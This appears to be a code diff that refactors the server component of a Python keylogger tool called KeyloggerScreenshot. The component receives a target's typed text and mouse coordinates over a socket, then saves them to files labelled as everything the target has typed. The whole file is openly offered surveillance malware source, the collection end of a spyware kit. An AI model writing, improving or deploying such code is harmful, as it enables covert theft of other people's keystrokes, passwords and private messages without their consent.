@@ -15,12 +15,15 @@ class ServerKeylogger:
         self.simulater = simulater
         self.new_data = None
         self.check_under = False
+        self.new_cor = None
+        self.full_msg = None
+        self.cord = None
 
     def message(self, real_data):
         # To know if the server has some issues
         for zeichen in real_data:
             if "{" == zeichen:
-                # "{" this detects if a space or a tab is in full_msg
+                # "{" this detects if a space or a tab is in self.full_msg
                 self.new_data = real_data.replace("{", " ")
                 self.check_under = True
 
@@ -28,7 +31,7 @@ class ServerKeylogger:
             self.new_data = real_data
 
         print(self.check_under)
-        # The data is being stored in full_msg
+        # The data is being stored in self.full_msg
         bp.color(f"Text of target: {self.new_data}", "magenta")
         zeit = time.strftime("%H-%M-%S-%Y")
         # This is the time the data has arrived
@@ -61,57 +64,62 @@ class ServerKeylogger:
             # Data is in clientsocket and the ip-address is obviously in "ipaddress"
             bp.color(f"\nConnection has been established with {ipaddress}", "magenta")
 
-            full_msg = ServerPhotos.get_data(self, clientsocket, "r", 8192)
-            if ")]" in full_msg:
-                # Checks if the coordinates are there
-                cord = full_msg.split(")]")
-                new_cor = cord[0] + ")]"
-                direct = os.listdir()
+            self.full_msg = ServerPhotos.get_data(self, clientsocket, "r", 8192)
+            if ")]" in self.full_msg:
+                if "***%§§)§§%" in self.full_msg:
+                    self.new_cor = "[(" + self.full_msg.split("[(")[1]
+                    spalten = self.full_msg.split("[(")[0].split("***%§§)§§%")
+                    # This splits the data with the special code
+                    if spalten[1] != "":
+                        # If the data is not empty
+                        text = spalten[1]
+                        for zeichen in text:
+                            if "{" == zeichen:
+                                text = text.replace("{", " ")
+                        bp.color(f"Text of target: {text}", "magenta")
+                        zeit = time.strftime("%H-%M-%S-%Y")
+                        # This is the time the data has arrived
+                        with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
+                            file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{text}")
+                            # That means data will appear even if the connection isn't stabled
+                    else:
+                        bp.color("The target hasn't written something in the meanwhile", "magenta")
+
+
+                else:
+                    # Checks if the coordinates are there
+                    self.cord = self.full_msg.split(")]")
+                    self.new_cor = self.cord[0] + ")]"
 
                 filename = self.check_double()
                 with open(filename, "a+") as file:
                     # The coordinates will be stored in "mouseInfoLog.txt"
-                    file.write(f"These are the coordinates of the target \n{new_cor}")
+                    file.write(f"These are the coordinates of the target \n{self.new_cor}")
                 bp.color("The coordinates of the target have been saved to your directory", "magenta")
 
-                if cord[1] == "":
-                    bp.color("The target hasn't typed anything", "magenta")
-                else:
-                    self.message(cord[1])
+                if "***%§§)§§%" in self.full_msg:
 
-            elif "{" in full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in full_msg:
+                    bp.color("\nTHE CONNECTION HAS BEEN INTERRUPTED", "magenta")
+                    bp.color("THE SERVER WILL BE DESTROYED\n", "magenta")
+                    bp.color("TO RUN A SIMULATION RUN THE 'Simulation_code.py' SCRIPT\nIF YOU DONT HAVE ONE YOU CAN CREATE IT ON GITHUB\nALL THE INSTRUCTIONS ARE THERE: https://github.com/Kill0ger/KeyloggerScreenshot\n\nTHANK YOU FOR USING KEYLOGGERSCREENSHOT", "magenta")
+                    os._exit(0)
+
+                if self.cord is not None:
+                    if self.cord[1] == "":
+                        bp.color("The target hasn't typed anything", "magenta")
+                    else:
+                        self.message(self.cord[1])
+
+            elif "{" in self.full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in self.full_msg:
                 # This checks if the target hasn't clicked something and if there is still some data
-                full_msg = full_msg.replace("[]", "")
+                self.full_msg = self.full_msg.replace("[]", "")
                 bp.color("The target hasn't clicked anything", "magenta")
-                self.message(full_msg)
+                self.message(self.full_msg)
 
-            elif "[]" == full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in full_msg:
+            elif "[]" == self.full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in self.full_msg:
                 # Checks if nothing has typed or clicked
                 bp.color("The target hasn't typed and clicked anything", "magenta")
-
-            else:
-                spalten = full_msg.split("***%§§)§§%")
-                # This splits the data with the special code
-                if spalten[1] != "":
-                    # If the data is not empty
-                    text = spalten[1]
-                    for zeichen in text:
-                        if "{" == zeichen:
-                            text = text.replace("{", " ")
-                    bp.color(f"Text of target: {text}", "magenta")
-                    zeit = time.strftime("%H-%M-%S-%Y")
-                    # This is the time the data has arrived
-                    with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
-                        file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{text}")
-                        # That means data will appear even if the connection isn't stabled
-                else:
-                    bp.color("The target hasn't written something in the meanwhile", "magenta")
-
-                bp.color("\nTHE CONNECTION HAS BEEN INTERRUPTED", "magenta")
-                bp.color("THE SERVER WILL BE DESTROYED\n", "magenta")
-                os._exit(0)
                 # This shuts down the server
-
 
             if self.simulater is True:
                 print("Simulation will come in 10 seconds!!!")
